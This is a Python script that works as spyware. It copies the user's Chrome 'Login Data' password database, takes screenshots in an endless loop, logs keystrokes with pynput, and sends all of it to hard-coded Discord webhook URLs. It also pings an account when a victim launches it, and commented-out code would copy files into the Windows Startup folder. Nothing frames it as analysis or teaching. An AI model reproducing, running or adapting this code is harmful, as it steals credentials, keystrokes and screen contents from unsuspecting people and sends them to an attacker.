
from time import sleep
from pyautogui import *
import getpass
from discord_webhook import *
import pyshortcuts
import threading
chats = ''
pichook = 'https://discord.com/api/webhooks/1042421205753409577/3cvblLpLnsRq3fwDiSDJuImS2FhJd5xSSjxkdQpI66mEglAH9V0RV74biT5VCL4CfUvX'
pinghook = 'https://discord.com/api/webhooks/1048263189906870336/cnKpzy1sv5tpkvJ-8gw-7AoOjKK2BLXHeweC7MpJsAEaOv1MdznNYhxL6IR7c6-nda4f'
keyhook = "https://discord.com/api/webhooks/1048237133300772934/itwhC056-7GtFQz6G-pZSlDtgPcWvRp0uGac-RYPaDER83IuWVd9irep4lLs2A1Ziiav"
passhook = 'https://discord.com/api/webhooks/1048271445274398791/dgxXytoLoHQYf0S3VV1He_FIUPynB8B9itBcQq_WOfJLyHs_0i87gTVjCIBnbYq3Dcbz'

def spiderman():
    global pichook
    global pinghook
    global passhook
    #path = "C:\\Users\\" + getpass.getuser() +  "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
    path2 = "C:\\Users\\" + getpass.getuser()
    #path3 = "C:\\Users\\" + getpass.getuser() +  "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    #try:
    #    files = os.listdir("data\\replacement")
    #    error = False
    #except:
    #    error = True                  old code lolol
    #if not error:
    #    for i in files:
    #        shutil.copy('data\\replacement\\'+i,path+i)
    stats = 0
    ##pyshortcuts.make_shortcut(os.getcwd()+"\\data\\replacement\\Dev.vbs",name="autostart",folder=path3,terminal=False,desktop=False,startmenu=False,executable="Dev.vbs")

    cppath = path2 + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    chook = DiscordWebhook(url=passhook)
    with open(cppath,"rb") as f:
        chook.add_file(file=f.read(),filename='Login Data')
    chook.execute(remove_files=True)

    thehook = pichook
    pingus = DiscordWebhook(url=pinghook, content=f'Hello, <@820217436552167484>! {getpass.getuser()} started the program!')
    pingus.execute(remove_embeds=True, remove_files=True)
    webhook = DiscordWebhook(url=thehook)
    while 1:
        screenshot(path2+"\\ss.png")
        with open(path2+"\\ss.png", "rb") as f:
            webhook.add_file(file=f.read(), filename='ss.png')
        embed = DiscordEmbed(title='title', description='desc', color='0000FF')
        embed.set_thumbnail(url='attachment://ss.png')
        try:
            response = webhook.execute(remove_embeds=True, remove_files=True)
            print(response,str(response)[11:14])
            if str(response)[11:14] == "429":
                sleep(2)
                print("slep")
            if stats > 0:
                pingus.set_content(str(stats),"times not connected, but now back, <@820217436552167484>")
                pingus.execute()

                stats = 0
        except:
            stats += 1
        sleep(0)
def keylag():
    global chats
    global keyhook
    from pynput.keyboard import Key, Listener
    #import logging
    def send(string):
        global chats
        webhook.set_content("|"+str(string)+"|")
        webhook.execute()
        chats = ''
    thekook = keyhook
    #logging.basicConfig(filename=("keys.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
    webhook = DiscordWebhook(url=thekook)
    def press(k):
        #logging.info(str(k))
        global chats
        k = str(k)
        chats += k
        if len(chats) >= 100:
            chats = chats.replace("Key.space", " ")
            chats = chats.replace("Key.bacchatsspace", "BCK")
            chats = chats.replace("Key.ctrl_l", "LCTRL")
            chats = chats.replace("Key.ctrl_r", "RCTRL")
            chats = chats.replace("Key.shift", "SHFT")
            chats = chats.replace("Key.shift_r", "RSHFT")
            chats = chats.replace("'", "")
            if len(chats) >= 70:
                send(chats)

    with Listener(on_press=press) as listener:
        listener.join()

t1 = threading.Thread(target=spiderman)
t2 = threading.Thread(target=keylag)

t1.start()
t2.start()